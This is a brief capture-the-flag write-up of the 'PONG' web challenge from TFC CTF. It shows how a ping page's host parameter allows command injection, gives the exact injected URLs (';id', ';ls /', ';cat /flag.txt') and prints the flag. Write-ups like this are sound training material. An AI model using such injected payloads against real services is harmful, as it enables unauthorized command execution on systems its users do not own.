# TFC CTF

## WEB

### PONG

**Difficulty:** Warmup

**Statement:** Some random website that can ping hosts.

***

For this challenge, the web server hosts a service to perform pings via the URL: `http://01.linux.challenges.ctf.thefewchosen.com:49341/index.php?host=127.0.0.1`

A simple `;` after the ping command allows a command injection: `http://01.linux.challenges.ctf.thefewchosen.com:49341/index.php?host=127.0.0.1;id`

![image](https://user-images.githubusercontent.com/49941629/182030298-07a99108-7fb7-45cd-85b2-70e6371eaeea.png)

You just have to do a `ls /`: `http://01.linux.challenges.ctf.thefewchosen.com:49341/index.php?host=127.0.0.1;ls%20/`

![image](https://user-images.githubusercontent.com/49941629/182030366-3ad2ac16-e818-4b54-a28a-f4f108444e72.png)

 Then a `cat` to get the flag back ! `http://01.linux.challenges.ctf.thefewchosen.com:49341/index.php?host=127.0.0.1;cat%20/flag.txt`

![image](https://user-images.githubusercontent.com/49941629/182030414-d1be59d8-c4f8-4d25-972c-3e25287eed1b.png)

Flag: TFCCTF{C0mm4nd_1nj3c5i0n_1s_E4sy}
